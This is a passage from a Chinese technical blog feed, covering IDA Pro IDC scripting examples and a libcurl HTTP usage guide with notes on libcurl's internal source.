_readlongb() &#123;</div><div class="line">  return readlong(this.h, 1);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _readlongs() &#123;</div><div class="line">  return readlong(this.h, 0);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _writeshortb(val) &#123;</div><div class="line">  return writeshort(this.h, val, 1);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _writeshorts(val) &#123;</div><div class="line">  return writeshort(this.h, val, 0);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _readshortb() &#123;</div><div class="line">  return readshort(this.h, 1);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _readshorts() &#123;</div><div class="line">  return readshort(this.h, 0);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _loadfile(pos, addr, length) &#123;</div><div class="line">  return loadfile(this.h, pos, addr, length);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> _savefile(pos, addr, length) &#123;</div><div class="line">  return savefile(this.h, pos, addr, length);</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">//file</div><div class="line">auto fn = AskFile(1, &quot;*.txt&quot;, &quot;save file&quot;);//1=save, 0=open</div><div class="line">Message(&quot;save file = %s\n&quot;, fn);</div><div class="line">auto mf = MyFile(fn, &apos;w&apos;);</div><div class="line">//mf._writelongb(122222);</div><div class="line">//mf._writestr(&quot;test file write data&quot;);</div><div class="line">//writestr(mf.h, &quot;test file write data&quot;);</div><div class="line">//mf._savefile(0, 0x400000, 50);</div><div class="line">Message(&quot;file data = %s&quot;, mf._readstr());</div><div class="line">//Message(&quot;file data = %s&quot;, mf._readlongb());</div><div class="line"></div><div class="line"></div><div class="line">//name, address</div><div class="line">Message(&quot;%08x, %s\n&quot;, 0x400016, Name(0x400016));</div><div class="line">//Message(&quot;xxx = %s\n&quot;, NameEx(0x0040BD14, 0x0040BD1C));</div><div class="line">MakeNameEx(0x0040BD1C, &quot;testxxxx&quot;, 1);</div><div class="line">Message(&quot;xxx = %08x\n&quot;, LocByName(&quot;testxxxx&quot;));</div><div class="line">Message(&quot;xxx = %08x\n&quot;, LocByNameEx(0x0040BD14, &quot;testxxxx&quot;));</div><div class="line"></div><div class="line">//function</div><div class="line">Message(&quot;end = %08x, start = %08x\n&quot;, GetFunctionAttr(0x0040BD14, FUNCATTR_END), GetFunctionAttr(0x0040BD14, FUNCATTR_START));</div><div class="line">Message(&quot;f = %s\n&quot;, GetFunctionName(0x0040BD1C));</div><div class="line">Message(&quot;f_next = %08x\n&quot;, NextFunction(0x0040BD1C));</div><div class="line">Message(&quot;f_prev = %08x\n&quot;, PrevFunction(0x0040BD1C));</div><div class="line"></div><div class="line">//代码xref</div><div class="line">auto cur = Rfirst(0x0040BD1C);//跳到哪里去，第一个</div><div class="line">Message(&quot;to = %08x\n&quot;, cur);</div><div class="line">Message(&quot;to = %08x\n&quot;, Rnext(0x0040BD1C, cur));//跳到哪里去，下一个</div><div class="line">Message(&quot;to = %08x\n&quot;, XrefType());//fl_CN, fl_CF, fl_JN, fl_JF, fl_F</div><div class="line">cur = RfirstB(0x40B928);//什么地方跳来的，第一个</div><div class="line">Message(&quot;from = %08x\n&quot;, cur );</div><div class="line">Message(&quot;from = %08x\n&quot;, RnextB(0x40B928, cur));//什么地方跳来的，下一个</div><div class="line"></div><div class="line">//数据xref</div><div class="line">cur = Dfirst(0x01410559);//改地址引用的第一个数据的地址</div><div class="line">Message(&quot;to d = %08x\n&quot;, cur);</div><div class="line">Message(&quot;to d = %08x\n&quot;, Dnext(0x01410559, cur));</div><div class="line">Message(&quot;to = %08x\n&quot;, XrefType());//dr_O偏移量, dr_W数据写入, dr_R数据读取</div><div class="line">cur = DfirstB(0x01411EF0);//引用该数据的第一个地址</div><div class="line">Message(&quot;from d = %08x\n&quot;, cur);</div><div class="line">Message(&quot;from d = %08x\n&quot;, DnextB(0x01411EF0, cur));//引用该数据的下一个地址</div><div class="line"></div><div class="line">//database</div><div class="line">MakeUnkn(0x0043DC57, DOUNK_SIMPLE);//undefine</div><div class="line">MakeCode(0x0043DC57);//转为code</div><div class="line">//MakeUnkn(0x0043DC57, DOUNK_SIMPLE);//undefine</div><div class="line">//MakeUnkn(0x0043DC58, DOUNK_SIMPLE);//</div><div class="line">//MakeWord(0x0043DC57);//转为数据 MakeWord, MakeDword</div><div class="line">MakeComm(0x0043DC57, &quot;just for test comment&quot;);//</div><div class="line">//MakeFunction(s, e);//</div><div class="line">//MakeStr(s, e);//</div><div class="line"></div><div class="line">//search SEARCH_DOWN, SEARCH_NEXT, SEARCH_CASE</div><div class="line">Message(&quot;code = %08x\n&quot;, FindCode(0x400000, 1));//从这开始搜索一条指令</div><div class="line">Message(&quot;data = %08x\n&quot;, FindData(0x400000, 1));//从这开始搜索一个数据</div><div class="line">//Message(&quot;find = %08x\n&quot;, FindBinary(0x400000, 1, &quot;FFAB3740&quot;));//从这开始搜索hex数据</div><div class="line">auto row = 0;</div><div class="line">auto column = 0;</div><div class="line">//Message(&quot;find = %08x\n&quot;, FindText(0x400000, 1, row, column, &quot;http://&quot;));</div><div class="line"></div><div class="line">//asm</div><div class="line">Message(&quot;asm = %s\n&quot;, GetDisasm(0x0043D7D8));//asm = push    ebp             ; xxxxxxxxxxxxxxxx</div><div class="line">Message(&quot;asm = %s\n&quot;, GetMnem(0x0043D7D8));//asm = push</div><div class="line">Message(&quot;asm = %s\n&quot;, GetOpnd(0x0043D7D8, 0));//asm = ebp</div><div class="line">Message(&quot;asm = %d\n&quot;, GetOpType(0x0043D7D8, 0));//asm = 1</div><div class="line">Message(&quot;asm = %08x\n&quot;, GetOperandValue(0x0043D7D8, 0));//asm = 00000005</div><div class="line">Message(&quot;asm = %s\n&quot;, CommentEx(0x0043D7D8, 0));//asm = xxxxxxxxxxxxxxxx</div></pre></td></tr></table></figure> <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说，idc语法真的挺简单的，跟c基本一样，写起来不需要多大力气，就是需要熟悉idc提供的各类功能函数，应用起来才能得心应手。</p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;IDC是IDA扩展的一种脚本语言，用于自动化，或者扩展查询IDA数据库&lt;/p&gt; &lt;p&gt;可以使用IDC或者python编写&lt;/p&gt; &lt;p&gt;语法类似C、也应用了C++类似的对象特性和异常处理&lt;/p&gt; &lt;p&gt;可以是单独的IDC文件，通过File-&amp;gt;Script File加载，&lt;br&gt;也可以是简单的IDC命令，通过File-&amp;gt;Script Command来编写&lt;/p&gt;          </summary>            <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>                 <category term="IDAPro" scheme="https://anhkgg.github.io/tags/IDAPro/"/>            <category term="IDC" scheme="https://anhkgg.github.io/tags/IDC/"/>            <category term="reverse" scheme="https://anhkgg.github.io/tags/reverse/"/>        </entry>      <entry>     <title>libcurl小记-简单http封装使用-源码分析</title>     <link href="https://anhkgg.github.io/liburl-use-minihttp/"/>     <id>https://anhkgg.github.io/liburl-use-minihttp/</id>     <published>2016-08-25T12:32:06.000Z</published>     <updated>2016-08-26T00:29:49.952Z</updated>          <content type="html"><![CDATA[<h1 id="0x00-前面"><a href="#0x00-前面" class="headerlink" title="0x00. 前面"></a>0x00. 前面</h1><p>以前用Wininet api包了一个简单易用的http请求的lib，但是居然会遇到系统不支持的情况，难道要我自己用socket写吗？no way！</p> <p>以前知道liburl，第一次使用，啥都不知道，反正感觉挺强大的</p> <p>&lt; libcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP.</p> <p>须知，我这里只用到了HTTP</p> <p><a href="https://curl.haxx.se/" target="_blank" rel="external">home: https://curl.haxx.se/</a></p> <p><a href="https://curl.haxx.se/libcurl/" target="_blank" rel="external">document: https://curl.haxx.se/libcurl/</a></p> <p>其实使用比较简单，但对我没有认真看过文档，并且没有找到好资料的情况下，我遇到了很多弯路，并且想吐槽实例代码，搞那么复杂干嘛，还没有我想要的代码。</p> <a id="more"></a> <p>下面开始坑。</p> <h1 id="0x01-就这么简单"><a href="#0x01-就这么简单" class="headerlink" title="0x01. 就这么简单"></a>0x01. 就这么简单</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">/* curl stuff */ </div><div class="line">#include &lt;curl/curl.h&gt;</div><div class="line">//#pragma comment(lib, &quot;liburl.lib&quot;)</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">  CURL *curl;</div><div class="line">  CURLcode res;</div><div class="line"> </div><div class="line">  /* In windows, this will init the winsock stuff */ </div><div class="line">  curl_global_init(CURL_GLOBAL_ALL);</div><div class="line"> </div><div class="line">  /* get a curl handle */ </div><div class="line">  curl = curl_easy_init();</div><div class="line">  if(curl) &#123;</div><div class="line">    /* First set the URL that is about to receive our POST. This URL can</div><div class="line">       just as well be a https:// URL if that is what should receive the</div><div class="line">       data. */ </div><div class="line">    curl_easy_setopt(curl, CURLOPT_URL, &quot;http://postit.example.com/moo.cgi&quot;);</div><div class="line">    /* Now specify the POST data */ </div><div class="line">    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=daniel&amp;project=curl&quot;);</div><div class="line"> </div><div class="line">    /* Perform the request, res will get the return code */ </div><div class="line">    res = curl_easy_perform(curl);</div><div class="line">    /* Check for errors */ </div><div class="line">    if(res != CURLE_OK)</div><div class="line">      fprintf(stderr, &quot;curl_easy_perform() failed: %s\n&quot;,</div><div class="line">              curl_easy_strerror(res));</div><div class="line"> </div><div class="line">    /* always cleanup */ </div><div class="line">    curl_easy_cleanup(curl);</div><div class="line">  &#125;</div><div class="line">  curl_global_cleanup();</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>简单应用就是这样子，关键在这两句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl_easy_setopt(curl, CURLOPT_URL, &quot;http://postit.example.com/moo.cgi&quot;);</div><div class="line">    /* Now specify the POST data */ </div><div class="line">curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=daniel&amp;project=curl&quot;);</div></pre></td></tr></table></figure></p> <p>liburl通过设置各种回调函数来完成各种功能。</p> <h1 id="0x02-http请求"><a href="#0x02-http请求" class="headerlink" title="0x02. http请求"></a>0x02. http请求</h1><p>CURLOPT_URL ： 访问的目标url路径，如果是GET方式请求，需要将请求数据加到URL后面</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">www.baidu.com/login.asp?name=111&amp;password=111</div></pre></td></tr></table></figure> <p>CURLOPT_POSTFIELDS ： POST请求中发送的数据</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl_easy_setopt(curl, CURLOPT_POSTFIELDS, &quot;name=daniel&amp;project=curl&quot;);</div></pre></td></tr></table></figure> <p>并且POST请求中还需要设置CURLOPT_POST为1</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/* size of the POST data */</div><div class="line">curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());</div><div class="line">curl_easy_setopt(curl, CURLOPT_POST, 1);</div></pre></td></tr></table></figure> <p>另外，奇葩的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl_easy_setopt(curl, CURLOPT_URL, url.c_str()); //url在release可正常使用，debug去不行，只能使用url.c_str();</div></pre></td></tr></table></figure></p> <h1 id="0x03-接收数据"><a href="#0x03-接收数据" class="headerlink" title="0x03. 接收数据"></a>0x03. 接收数据</h1><p>接收数据需要注册CURLOPT_WRITEFUNCTION回调函数，在回调函数中进行数据处理</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl_easy_setopt(*curl, CURLOPT_WRITEFUNCTION, write_callback);</div></pre></td></tr></table></figure> <p>如果数据不能一次接收完成，需要利用回调中的参数来缓存数据，也就是通过CURLOPT_WRITEDATA设置</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl_easy_setopt(*curl, CURLOPT_WRITEDATA, data);</div></pre></td></tr></table></figure> <p>回调函数处理中，最后一次参数就是设置的用于缓存的变量，需要注意的是数据长度，不是size，而是<code>size*nmemb</code>。 并且如果返回值不等于size*nmemb，libcurl会认为处理失败</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata)</div><div class="line">&#123;</div><div class="line"> size_t all_size = size*nmemb;</div><div class="line"> PWRITE_CALLBACK_DATA data = (PWRITE_CALLBACK_DATA)userdata;</div><div class="line"></div><div class="line"> data-&gt;data.append(ptr);</div><div class="line"> data-&gt;size += all_size;</div><div class="line"></div><div class="line"> return all_size;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h1 id="0x04-cookie"><a href="#0x04-cookie" class="headerlink" title="0x04. cookie"></a>0x04. cookie</h1><p>通过cookie文件保存，读取cookie</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl_easy_setopt(*curl, CURLOPT_COOKIEJAR, &quot;cookie.txt&quot;);        //把服务器发过来的cookie保存到cookie.txt</div><div class="line">curl_easy_setopt(*curl, CURLOPT_COOKIEFILE, &quot;cookie.txt&quot;);        //读取本地存储的cookie</div></pre></td></tr></table></figure> <p>直接设置cookie信息</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//curl_easy_setopt(curl, CURLOPT_COOKIE, m_cookies.c_str());</div></pre></td></tr></table></figure> <h1 id="0x05-一点点分析"><a href="#0x05-一点点分析" class="headerlink" title="0x05. 一点点分析"></a>0x05. 一点点分析</h1><p>下面是遇到坑时的一小点点源码翻阅，觉得有用的可以看看</p> <h2 id="1-curl-easy-setopt调用中"><a href="#1-curl-easy-setopt调用中" class="headerlink" title="1. curl_easy_setopt调用中"></a>1. curl_easy_setopt调用中</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">//curl_easy_setopt调用中</div><div class="line">CURLcode curl_easy_setopt(struct Curl_easy *data, CURLoption tag, ...)//lib/easy.c</div><div class="line">--&gt;</div><div class="line">CURLcode Curl_setopt(struct Curl_easy *data, CURLoption option,</div><div class="line">                     va_list param)//lib/url.c</div><div class="line">&#123;</div><div class="line">    //根据option类型，设置不同回调</div><div class="line">    //保存在data-&gt;set的不同字段中</div><div class="line">    case CURLOPT_URL:</div><div class="line">    if(data-&gt;change.url_alloc) &#123;</div><div class="line">      /* the already set URL is allocated, free it first! */</div><div class="line">      Curl_safefree(data-&gt;change.url);</div><div class="line">      data-&gt;change.url_alloc = FALSE;</div><div class="line">    &#125;</div><div class="line">    result = setstropt(&amp;data-&gt;set.str[STRING_SET_URL],</div><div class="line">                       va_arg(param, char *));</div><div class="line">    data-&gt;change.url = data-&gt;set.str[STRING_SET_URL];</div><div class="line">    break;</div><div class="line">    case CURLOPT_PORT:</div><div class="line">    data-&gt;set.use_port = va_arg(param, long);</div><div class="line">    break;</div><div class="line">    case CURLOPT_WRITEFUNCTION:</div><div class="line">    data-&gt;set.fwrite_func = va_arg(param, curl_write_callback);</div><div class="line">    if(!data-&gt;set.fwrite_func) &#123;</div><div class="line">      data-&gt;set.is_fwrite_set = 0;</div><div class="line">      /* When set to NULL, reset to our internal default function */</div><div class="line">      data-&gt;set.fwrite_func = (curl_write_callback)fwrite;</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">      data-&gt;set.is_fwrite_set = 1;</div><div class="line">    break;</div><div class="line">    case CURLOPT_WRITEDATA:</div><div class="line">    data-&gt;set.out = va_arg(param, void *);</div><div class="line">    break;</div><div class="line">    case CURLOPT_HTTPHEADER:</div><div class="line">    data-&gt;set.headers = va_arg(param, struct curl_slist *);</div><div class="line">    break;</div><div class="line">    case CURLOPT_COOKIEJAR:</div><div class="line">    &#123;</div><div class="line">    struct CookieInfo *newcookies;</div><div class="line">    result = setstropt(&amp;data-&gt;set.str[STRING_COOKIEJAR],</div><div class="line">                       va_arg(param, char *));</div><div class="line">    newcookies = Curl_cookie_init(data, NULL, data-&gt;cookies,</div><div class="line">                                  data-&gt;set.cookiesession);</div><div class="line">    if(!newcookies)</div><div class="line">      result = CURLE_OUT_OF_MEMORY;</div><div class="line">    data-&gt;cookies = newcookies;</div><div class="line">    &#125;</div><div class="line">    break;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure> <h2 id="2-请求中"><a href="#2-请求中" class="headerlink" title="2. 请求中"></a>2. 请求中</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div></pre></td><td class="code"><pre><div class="line">CURLcode curl_easy_perform(struct Curl_easy *data)//lib/easy.c</div><div class="line">-&gt;</div><div class="line">static CURLcode easy_perform(struct Curl_easy *data, bool events)//lib/easy.c</div><div class="line">-&gt;</div><div class="line">static CURLcode easy_transfer(struct Curl_multi *multi)//lib/easy.c</div><div class="line">-&gt;</div><div class="line">CURLMcode curl_multi_perform(struct Curl_multi *multi, int *running_handles)//\lib\multi.c</div><div class="line">&#123;</div><div class="line">  data=multi-&gt;easyp;//就是Curl_easy *data</div><div class="line">  while(data) &#123;</div><div class="line">    CURLMcode result;</div><div class="line">    SIGPIPE_VARIABLE(pipe_st);</div><div class="line"></div><div class="line">    sigpipe_ignore(data, &amp;pipe_st);</div><div class="line">    result = multi_runsingle(multi, now, data);//一次请求</div><div class="line">    sigpipe_restore(&amp;pipe_st);</div><div class="line"></div><div class="line">    if(result)</div><div class="line">      returncode = result;</div><div class="line"></div><div class="line">    data = data-&gt;next; /* operate on next handle */</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">-&gt;</div><div class="line">static CURLMcode multi_runsingle(struct Curl_multi *multi,</div><div class="line">                                 struct timeval now,</div><div class="line">                                 struct Curl_easy *data)//\lib\multi.c</div><div class="line">&#123;</div><div class="line">    //这里面有个重要的字段data-&gt;mstate，表示当前curl的状态</div><div class="line">    //通过multistate(data, CURLM_STATE_PERFORM);=&gt;static void mstate(struct Curl_easy *data, CURLMstate state)赋值</div><div class="line">    //CURLMcode curl_multi_add_handle(struct Curl_multi *multi, struct Curl_easy *data) =&gt; multistate(data, CURLM_STATE_INIT);</div><div class="line">    //CURLMcode Curl_multi_add_perform(struct Curl_multi *multi, struct Curl_easy *data, struct connectdata *conn)=&gt;multistate(data, CURLM_STATE_PERFORM);</div><div class="line">    //等等</div><div class="line">    </div><div class="line">    //...</div><div class="line">    do&#123;</div><div class="line">        //本函数中，循环各种状态判断，处理不同逻辑</div><div class="line">        switch(data-&gt;mstate) &#123;</div><div class="line">        //初始化</div><div class="line">        case CURLM_STATE_INIT:</div><div class="line">          /* init this transfer. */</div><div class="line">          result=Curl_pretransfer(data);//各种信息初始化，ssl，cookie</div><div class="line">    </div><div class="line">          if(!result) &#123;</div><div class="line">            /* after init, go CONNECT */</div><div class="line">            multistate(data, CURLM_STATE_CONNECT);//状态更改</div><div class="line">            Curl_pgrsTime(data, TIMER_STARTOP);</div><div class="line">            rc = CURLM_CALL_MULTI_PERFORM;</div><div class="line">          &#125;</div><div class="line">          break;</div><div class="line">         case CURLM_STATE_CONNECT:</div><div class="line">          /* Connect. We want to get a connection identifier filled in. */</div><div class="line">          Curl_pgrsTime(data, TIMER_STARTSINGLE);</div><div class="line">          result = Curl_connect(data, &amp;data-&gt;easy_conn,</div><div class="line">                                &amp;async, &amp;protocol_connect);</div><div class="line">          if(CURLE_NO_CONNECTION_AVAILABLE == result) &#123;</div><div class="line">            /* There was no connection available. We will go to the pending</div><div class="line">               state and wait for an available connection. */</div><div class="line">            multistate(data, CURLM_STATE_CONNECT_PEND);</div><div class="line">    </div><div class="line">            /* add this handle to the list of connect-pending handles */</div><div class="line">            if(!Curl_llist_insert_next(multi-&gt;pending, multi-&gt;pending-&gt;tail, data))</div><div class="line">              result = CURLE_OUT_OF_MEMORY;</div><div class="line">            else</div><div class="line">              result = CURLE_OK;</div><div class="line">            break;</div><div class="line">          &#125;</div><div class="line">    </div><div class="line">          if(!result) &#123;</div><div class="line">            /* Add this handle to the send or pend pipeline */</div><div class="line">            result = Curl_add_handle_to_pipeline(data, data-&gt;easy_conn);</div><div class="line">            if(result)</div><div class="line">              disconnect_conn = TRUE;</div><div class="line">            else &#123;</div><div class="line">              if(async)</div><div class="line">                /* We&apos;re now waiting for an asynchronous name lookup */</div><div class="line">                multistate(data, CURLM_STATE_WAITRESOLVE);</div><div class="line">              else &#123;</div><div class="line">                /* after the connect has been sent off, go WAITCONNECT unless the</div><div class="line">                   protocol connect is already done and we can go directly to</div><div class="line">                   WAITDO or DO! */</div><div class="line">                rc = CURLM_CALL_MULTI_PERFORM;</div><div class="line">    </div><div class="line">                if(protocol_connect)</div><div class="line">                  multistate(data, Curl_pipeline_wanted(multi, CURLPIPE_HTTP1)?</div><div class="line">                             CURLM_STATE_WAITDO:CURLM_STATE_DO);</div><div class="line">                else &#123;</div><div class="line">    #ifndef CURL_DISABLE_HTTP</div><div class="line">                  if(data-&gt;easy_conn-&gt;tunnel_state[FIRSTSOCKET] == TUNNEL_CONNECT)</div><div class="line">                    multistate(data, CURLM_STATE_WAITPROXYCONNECT);</div><div class="line">                  else</div><div class="line">    #endif</div><div class="line">                    multistate(data, CURLM_STATE_WAITCONNECT);</div><div class="line">                &#125;</div><div class="line">              &#125;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          break;</div><div class="line">        case CURLM_STATE_DO://开始发送</div><div class="line">            /* Perform the protocol&apos;s DO action */</div><div class="line">            result = multi_do(&amp;data-&gt;easy_conn, &amp;dophase_done);</div><div class="line">            //-&gt;</div><div class="line">            //详细的http请求封装，可以看看这个Curl_http</div><div class="line">            //CURLcode Curl_http(struct connectdata *conn, bool *done)//\lib\http.c</div><div class="line">            </div><div class="line">        case CURLM_STATE_DONE:</div><div class="line">            /* post-transfer command */</div><div class="line">            res = multi_done(&amp;data-&gt;easy_conn, result, FALSE);</div><div class="line">            </div><div class="line">        case CURLM_STATE_PERFORM:</div><div class="line">            /* read/write data if it is ready to do so */</div><div class="line">            result = Curl_readwrite(data-&gt;easy_conn, data, &amp;done);//接受数据中</div><div class="line"></div><div class="line">        //...</div><div class="line">        </div><div class="line">    &#125;while((rc == CURLM_CALL_MULTI_PERFORM) || multi_ischanged(multi, FALSE));</div><div class="line"></div><div class="line">  data-&gt;result = result;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//所有状态</div><div class="line">/* NOTE: if you add a state here, add the name to the statename[] array as</div><div class="line">   well!</div><div class="line">*/</div><div class="line">typedef enum &#123;</div><div class="line">  CURLM_STATE_INIT,         /* 0 - start in this state */</div><div class="line">  CURLM_STATE_CONNECT_PEND, /* 1 - no connections, waiting for one */</div><div class="line">  CURLM_STATE_CONNECT,      /* 2 - resolve/connect has been sent off */</div><div class="line">  CURLM_STATE_WAITRESOLVE,  /* 3 - awaiting the resolve to finalize */</div><div class="line">  CURLM_STATE_WAITCONNECT,  /* 4 - awaiting the TCP connect to finalize */</div><div class="line">  CURLM_STATE_WAITPROXYCONNECT, /* 5 - awaiting proxy CONNECT to finalize */</div><div class="line">  CURLM_STATE_SENDPROTOCONNECT, /* 6 - initiate protocol connect procedure */</div><div class="line">  CURLM_STATE_PROTOCONNECT, /* 7 - completing the protocol-specific connect</div><div class="line">                                   phase */</div><div class="line">  CURLM_STATE_WAITDO,       /* 8 - wait for our turn to send the request */</div><div class="line">  CURLM_STATE_DO,           /* 9 - start send off the request (part 1) */</div><div class="line">  CURLM_STATE_DOING,        /* 10 - sending off the request (part 1) */</div><div class="line">  CURLM_STATE_DO_MORE,      /* 11 - send off the request (part 2) */</div><div class="line">  CURLM_STATE_DO_DONE,      /* 12 - done sending off request */</div><div class="line">  CURLM_STATE_WAITPERFORM,  /* 13 - wait for our turn to read the response */</div><div class="line">  CURLM_STATE_PERFORM,      /* 